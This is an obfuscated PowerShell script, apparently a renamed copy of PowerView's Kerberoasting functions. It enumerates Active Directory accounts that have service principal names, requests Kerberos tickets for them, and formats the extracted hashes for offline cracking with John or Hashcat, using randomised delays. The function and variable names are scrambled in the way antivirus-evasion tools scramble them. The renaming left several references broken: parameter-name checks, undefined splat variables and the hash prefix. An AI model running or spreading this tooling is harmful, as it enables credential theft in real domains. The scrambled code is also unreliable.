function surplices {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $INWaDscP99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $xjIXoipG99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $YJuUMqiV99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $jqeJfdeV99,
        [ValidateNotNullOrEmpty()]
        [String]
        $aUJFFHJW99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $ivTtnnIV99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $xWUvDOiv99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $hxVGBRIl99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $jyWHRfAj99 = 120,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $TrTVcuNY99,
        [Switch]
        $hizHEUSE99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $LYytuNXy99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $HFoCNide99 = $INWaDscP99
        }
        else {
            if ($PSBoundParameters['Credential']) {
                $ZfxpRIOx99 = erred -LYytuNXy99 $LYytuNXy99
            }
            else {
                $ZfxpRIOx99 = erred
            }
            $HFoCNide99 = $ZfxpRIOx99.Name
        }
        if (-not $PSBoundParameters['Server']) {
            try {
                if ($ZfxpRIOx99) {
                    $zEPMUgCL99 = $ZfxpRIOx99.PdcRoleOwner.Name
                }
                elseif ($PSBoundParameters['Credential']) {
                    $zEPMUgCL99 = ((erred -LYytuNXy99 $LYytuNXy99).PdcRoleOwner).Name
                }
                else {
                    $zEPMUgCL99 = ((erred).PdcRoleOwner).Name
                }
            }
            catch {
                throw "[surplices] Error in retrieving PDC for current domain: $_"
            }
        }
        else {
            $zEPMUgCL99 = $ivTtnnIV99
        }
        $nhjHNiuy99 = 'LDAP://'
        if ($zEPMUgCL99 -and ($zEPMUgCL99.Trim() -ne '')) {
            $nhjHNiuy99 += $zEPMUgCL99
            if ($HFoCNide99) {
                $nhjHNiuy99 += '/'
            }
        }
        if ($PSBoundParameters['SearchBasePrefix']) {
            $nhjHNiuy99 += $aUJFFHJW99 + ','
        }
        if ($PSBoundParameters['SearchBase']) {
            if ($jqeJfdeV99 -Match '^GC://') {
                $DN = $jqeJfdeV99.ToUpper().Trim('/')
                $nhjHNiuy99 = ''
            }
            else {
                if ($jqeJfdeV99 -match '^LDAP://') {
                    if ($jqeJfdeV99 -match "LDAP://.+/.+") {
                        $nhjHNiuy99 = ''
                        $DN = $jqeJfdeV99
                    }
                    else {
                        $DN = $jqeJfdeV99.SubString(7)
                    }
                }
                else {
                    $DN = $jqeJfdeV99
                }
            }
        }
        else {
            if ($HFoCNide99 -and ($HFoCNide99.Trim() -ne '')) {
                $DN = "DC=$($HFoCNide99.Replace('.', ',DC='))"
            }
        }
        $nhjHNiuy99 += $DN
        Write-Verbose "[surplices] search string: $nhjHNiuy99"
        if ($LYytuNXy99 -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[surplices] Using alternate credentials for LDAP connection"
            $ZfxpRIOx99 = New-Object DirectoryServices.DirectoryEntry($nhjHNiuy99, $LYytuNXy99.UserName, $LYytuNXy99.GetNetworkCredential().Password)
            $PGApFvvE99 = New-Object System.DirectoryServices.DirectorySearcher($ZfxpRIOx99)
        }
        else {
            $PGApFvvE99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$nhjHNiuy99)
        }
        $PGApFvvE99.PageSize = $hxVGBRIl99
        $PGApFvvE99.SearchScope = $xWUvDOiv99
        $PGApFvvE99.CacheResults = $False
        $PGApFvvE99.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
        if ($PSBoundParameters['ServerTimeLimit']) {
            $PGApFvvE99.ServerTimeLimit = $jyWHRfAj99
        }
        if ($PSBoundParameters['Tombstone']) {
            $PGApFvvE99.Tombstone = $True
        }
        if ($PSBoundParameters['LDAPFilter']) {
            $PGApFvvE99.filter = $xjIXoipG99
        }
        if ($PSBoundParameters['SecurityMasks']) {
            $PGApFvvE99.SecurityMasks = Switch ($TrTVcuNY99) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }
        if ($PSBoundParameters['Properties']) {
            $WCxHmeaj99 = $YJuUMqiV99| ForEach-Object { $_.Split(',') }
            $Null = $PGApFvvE99.PropertiesToLoad.AddRange(($WCxHmeaj99))
        }
        $PGApFvvE99
    }
}
function glean {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $YJuUMqiV99
    )
    $GGyBviHW99 = @{}
    $YJuUMqiV99.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                $GGyBviHW99[$_] = $YJuUMqiV99[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $GGyBviHW99[$_] = $YJuUMqiV99[$_][0] -as $KbLuAFju99
            }
            elseif ($_ -eq 'samaccounttype') {
                $GGyBviHW99[$_] = $YJuUMqiV99[$_][0] -as $bovjmXEZ99
            }
            elseif ($_ -eq 'objectguid') {
                $GGyBviHW99[$_] = (New-Object Guid (,$YJuUMqiV99[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $GGyBviHW99[$_] = $YJuUMqiV99[$_][0] -as $WnvZIWkw99
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                $ZGMyshPR99 = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $YJuUMqiV99[$_][0], 0
                if ($ZGMyshPR99.Owner) {
                    $GGyBviHW99['Owner'] = $ZGMyshPR99.Owner
                }
                if ($ZGMyshPR99.Group) {
                    $GGyBviHW99['Group'] = $ZGMyshPR99.Group
                }
                if ($ZGMyshPR99.DiscretionaryAcl) {
                    $GGyBviHW99['DiscretionaryAcl'] = $ZGMyshPR99.DiscretionaryAcl
                }
                if ($ZGMyshPR99.SystemAcl) {
                    $GGyBviHW99['SystemAcl'] = $ZGMyshPR99.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($YJuUMqiV99[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $GGyBviHW99[$_] = "NEVER"
                }
                else {
                    $GGyBviHW99[$_] = [datetime]::fromfiletime($YJuUMqiV99[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                if ($YJuUMqiV99[$_][0] -is [System.MarshalByRefObject]) {
                    $Temp = $YJuUMqiV99[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $GGyBviHW99[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    $GGyBviHW99[$_] = ([datetime]::FromFileTime(($YJuUMqiV99[$_][0])))
                }
            }
            elseif ($YJuUMqiV99[$_][0] -is [System.MarshalByRefObject]) {
                $Prop = $YJuUMqiV99[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $GGyBviHW99[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose "[glean] error: $_"
                    $GGyBviHW99[$_] = $Prop[$_]
                }
            }
            elseif ($YJuUMqiV99[$_].count -eq 1) {
                $GGyBviHW99[$_] = $YJuUMqiV99[$_][0]
            }
            else {
                $GGyBviHW99[$_] = $YJuUMqiV99[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $GGyBviHW99
    }
    catch {
        Write-Warning "[glean] Error parsing LDAP properties : $_"
    }
}
function erred {
    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $INWaDscP99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $LYytuNXy99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            Write-Verbose '[erred] Using alternate credentials for erred'
            if ($PSBoundParameters['Domain']) {
                $HFoCNide99 = $INWaDscP99
            }
            else {
                $HFoCNide99 = $LYytuNXy99.GetNetworkCredential().Domain
                Write-Verbose "[erred] Extracted domain '$HFoCNide99' from -LYytuNXy99"
            }
            $PLNsHoAI99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $HFoCNide99, $LYytuNXy99.UserName, $LYytuNXy99.GetNetworkCredential().Password)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($PLNsHoAI99)
            }
            catch {
                Write-Verbose "[erred] The specified domain '$HFoCNide99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $PLNsHoAI99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $INWaDscP99)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($PLNsHoAI99)
            }
            catch {
                Write-Verbose "[erred] The specified domain '$INWaDscP99' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[erred] Error retrieving the current domain: $_"
            }
        }
    }
}
function guyed {
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,
        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $fOxJnVil99 = 'John',
        [ValidateRange(0,10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $pSBIvsfL99 = .3,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $LYytuNXy99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
        if ($PSBoundParameters['Credential']) {
            $ryAabVWo99 = Invoke-UserImpersonation -LYytuNXy99 $LYytuNXy99
        }
    }
    PROCESS {
        if ($PSBoundParameters['User']) {
            $WOnuopef99 = $User
        }
        else {
            $WOnuopef99 = $SPN
        }
	
	$rfURttBY99 = New-Object System.Random
        ForEach ($Object in $WOnuopef99) {
            if ($PSBoundParameters['User']) {
                $WmhiZNKK99 = $Object.ServicePrincipalName
                $xhEYwlbS99 = $Object.SamAccountName
                $paCofdJG99 = $Object.DistinguishedName
            }
            else {
                $WmhiZNKK99 = $Object
                $xhEYwlbS99 = 'UNKNOWN'
                $paCofdJG99 = 'UNKNOWN'
            }
            if ($WmhiZNKK99 -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $WmhiZNKK99 = $WmhiZNKK99[0]
            }
            try {
                $VDTAlmSe99 = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $WmhiZNKK99
            }
            catch {
                Write-Warning "[guyed] Error requesting ticket for SPN '$WmhiZNKK99' from user '$paCofdJG99' : $_"
            }
            if ($VDTAlmSe99) {
                $SHGczOqL99 = $VDTAlmSe99.GetRequest()
            }
            if ($SHGczOqL99) {
                $Out = New-Object PSObject
                $jcCGBQOU99 = [System.BitConverter]::ToString($SHGczOqL99) -replace '-'
                if($jcCGBQOU99 -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $nUHOBpIc99 = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $KdXWHcCa99 = $Matches.DataToEnd.Substring(0,$nUHOBpIc99*2)
                    if($Matches.DataToEnd.Substring($nUHOBpIc99*2, 4) -ne 'A482') {
                        Write-Warning 'Error parsing ciphertext for the SPN  $($VDTAlmSe99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"'
                        $Hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($SHGczOqL99).Replace('-',''))
                    } else {
                        $Hash = "$($KdXWHcCa99.Substring(0,32))`$$($KdXWHcCa99.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($VDTAlmSe99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($SHGczOqL99).Replace('-',''))
                }
                if($Hash) {
                    if ($fOxJnVil99 -match 'John') {
                        $SVdoxTRP99 = "`$frNaLeoT99`$$($VDTAlmSe99.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($paCofdJG99 -ne 'UNKNOWN') {
                            $BBbtlApB99 = $paCofdJG99.SubString($paCofdJG99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $BBbtlApB99 = 'UNKNOWN'
                        }
                        $SVdoxTRP99 = "`$frNaLeoT99`$$($Etype)`$*$xhEYwlbS99`$$BBbtlApB99`$$($VDTAlmSe99.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $SVdoxTRP99
                }
                $Out | Add-Member Noteproperty 'SamAccountName' $xhEYwlbS99
                $Out | Add-Member Noteproperty 'DistinguishedName' $paCofdJG99
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $VDTAlmSe99.ServicePrincipalName
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                Write-Output $Out
            }
            Start-Sleep -Seconds $rfURttBY99.Next((1-$pSBIvsfL99)*$Delay, (1+$pSBIvsfL99)*$Delay)
        }
    }
    END {
        if ($ryAabVWo99) {
            Invoke-RevertToSelf -TokenHandle $ryAabVWo99
        }
    }
}
function lizard {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $skWcQXmU99,
        [Switch]
        $SPN,
        [Switch]
        $slOKoJwK99,
        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $bQyUsxXh99,
        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $wGDTNPAi99,
        [Switch]
        $heswVQej99,
        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $XSqsssUM99,
        [ValidateNotNullOrEmpty()]
        [String]
        $INWaDscP99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $xjIXoipG99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $YJuUMqiV99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $jqeJfdeV99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $ivTtnnIV99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $xWUvDOiv99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $hxVGBRIl99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $jyWHRfAj99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $TrTVcuNY99,
        [Switch]
        $hizHEUSE99,
        [Alias('ReturnOne')]
        [Switch]
        $ISLSTwbQ99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $LYytuNXy99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $EUnLHhar99 = @{}
        if ($PSBoundParameters['Domain']) { $EUnLHhar99['Domain'] = $INWaDscP99 }
        if ($PSBoundParameters['Properties']) { $EUnLHhar99['Properties'] = $YJuUMqiV99 }
        if ($PSBoundParameters['SearchBase']) { $EUnLHhar99['SearchBase'] = $jqeJfdeV99 }
        if ($PSBoundParameters['Server']) { $EUnLHhar99['Server'] = $ivTtnnIV99 }
        if ($PSBoundParameters['SearchScope']) { $EUnLHhar99['SearchScope'] = $xWUvDOiv99 }
        if ($PSBoundParameters['ResultPageSize']) { $EUnLHhar99['ResultPageSize'] = $hxVGBRIl99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $EUnLHhar99['ServerTimeLimit'] = $jyWHRfAj99 }
        if ($PSBoundParameters['SecurityMasks']) { $EUnLHhar99['SecurityMasks'] = $TrTVcuNY99 }
        if ($PSBoundParameters['Tombstone']) { $EUnLHhar99['Tombstone'] = $hizHEUSE99 }
        if ($PSBoundParameters['Credential']) { $EUnLHhar99['Credential'] = $LYytuNXy99 }
        $iCpoqohH99 = surplices @SearcherArguments
    }
    PROCESS {
        if ($iCpoqohH99) {
            $nVEIfRZb99 = ''
            $htsXyeQi99 = ''
            $skWcQXmU99 | Where-Object {$_} | ForEach-Object {
                $XgEFJhgy99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($XgEFJhgy99 -match '^S-1-') {
                    $nVEIfRZb99 += "(objectsid=$XgEFJhgy99)"
                }
                elseif ($XgEFJhgy99 -match '^CN=') {
                    $nVEIfRZb99 += "(distinguishedname=$XgEFJhgy99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $YuRNNNBb99 = $XgEFJhgy99.SubString($XgEFJhgy99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[lizard] Extracted domain '$YuRNNNBb99' from '$XgEFJhgy99'"
                        $EUnLHhar99['Domain'] = $YuRNNNBb99
                        $iCpoqohH99 = surplices @SearcherArguments
                        if (-not $iCpoqohH99) {
                            Write-Warning "[lizard] Unable to retrieve domain searcher for '$YuRNNNBb99'"
                        }
                    }
                }
                elseif ($XgEFJhgy99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $vDxOXCCo99 = (([Guid]$XgEFJhgy99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $nVEIfRZb99 += "(objectguid=$vDxOXCCo99)"
                }
                elseif ($XgEFJhgy99.Contains('\')) {
                    $BMNKonkp99 = $XgEFJhgy99.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($BMNKonkp99) {
                        $BBbtlApB99 = $BMNKonkp99.SubString(0, $BMNKonkp99.IndexOf('/'))
                        $vappfwzY99 = $XgEFJhgy99.Split('\')[1]
                        $nVEIfRZb99 += "(samAccountName=$vappfwzY99)"
                        $EUnLHhar99['Domain'] = $BBbtlApB99
                        Write-Verbose "[lizard] Extracted domain '$BBbtlApB99' from '$XgEFJhgy99'"
                        $iCpoqohH99 = surplices @SearcherArguments
                    }
                }
                else {
                    $nVEIfRZb99 += "(samAccountName=$XgEFJhgy99)"
                }
            }
            if ($nVEIfRZb99 -and ($nVEIfRZb99.Trim() -ne '') ) {
                $htsXyeQi99 += "(|$nVEIfRZb99)"
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[lizard] Searching for non-null service principal names'
                $htsXyeQi99 += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[lizard] Searching for users who can be delegated'
                $htsXyeQi99 += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[lizard] Searching for users who are sensitive and not trusted for delegation'
                $htsXyeQi99 += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[lizard] Searching for adminCount=1'
                $htsXyeQi99 += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[lizard] Searching for users that are trusted to authenticate for other principals'
                $htsXyeQi99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[lizard] Searching for user accounts that do not require kerberos preauthenticate'
                $htsXyeQi99 += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[lizard] Using additional LDAP filter: $xjIXoipG99"
                $htsXyeQi99 += "$xjIXoipG99"
            }
            $FYBcoSYo99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $PeQpCkEk99 = $_.Substring(4)
                    $YPutSjmM99 = [Int]($WnvZIWkw99::$PeQpCkEk99)
                    $htsXyeQi99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$YPutSjmM99))"
                }
                else {
                    $YPutSjmM99 = [Int]($WnvZIWkw99::$_)
                    $htsXyeQi99 += "(userAccountControl:1.2.840.113556.1.4.803:=$YPutSjmM99)"
                }
            }
            $iCpoqohH99.filter = "(&(samAccountType=805306368)$htsXyeQi99)"
            Write-Verbose "[lizard] filter string: $($iCpoqohH99.filter)"
            if ($PSBoundParameters['FindOne']) { $CIbZGzez99 = $iCpoqohH99.FindOne() }
            else { $CIbZGzez99 = $iCpoqohH99.FindAll() }
            $CIbZGzez99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = glean -YJuUMqiV99 $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($CIbZGzez99) {
                try { $CIbZGzez99.dispose() }
                catch {
                    Write-Verbose "[lizard] Error disposing of the Results object: $_"
                }
            }
            $iCpoqohH99.dispose()
        }
    }
}
function plagues {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $skWcQXmU99,
        [ValidateNotNullOrEmpty()]
        [String]
        $INWaDscP99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $xjIXoipG99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $jqeJfdeV99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $ivTtnnIV99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $xWUvDOiv99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $hxVGBRIl99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $jyWHRfAj99,
        [Switch]
        $hizHEUSE99,
        [ValidateRange(0,10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $pSBIvsfL99 = .3,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $fOxJnVil99 = 'John',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $LYytuNXy99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $EzzZrvNh99 = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $EzzZrvNh99['Domain'] = $INWaDscP99 }
        if ($PSBoundParameters['LDAPFilter']) { $EzzZrvNh99['LDAPFilter'] = $xjIXoipG99 }
        if ($PSBoundParameters['SearchBase']) { $EzzZrvNh99['SearchBase'] = $jqeJfdeV99 }
        if ($PSBoundParameters['Server']) { $EzzZrvNh99['Server'] = $ivTtnnIV99 }
        if ($PSBoundParameters['SearchScope']) { $EzzZrvNh99['SearchScope'] = $xWUvDOiv99 }
        if ($PSBoundParameters['ResultPageSize']) { $EzzZrvNh99['ResultPageSize'] = $hxVGBRIl99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $EzzZrvNh99['ServerTimeLimit'] = $jyWHRfAj99 }
        if ($PSBoundParameters['Tombstone']) { $EzzZrvNh99['Tombstone'] = $hizHEUSE99 }
        if ($PSBoundParameters['Credential']) { $EzzZrvNh99['Credential'] = $LYytuNXy99 }
        if ($PSBoundParameters['Credential']) {
            $ryAabVWo99 = Invoke-UserImpersonation -LYytuNXy99 $LYytuNXy99
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $EzzZrvNh99['Identity'] = $skWcQXmU99 }
        lizard @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | guyed -Delay $Delay -fOxJnVil99 $fOxJnVil99 -pSBIvsfL99 $pSBIvsfL99
    }
    END {
        if ($ryAabVWo99) {
            Invoke-RevertToSelf -TokenHandle $ryAabVWo99
        }
    }
}
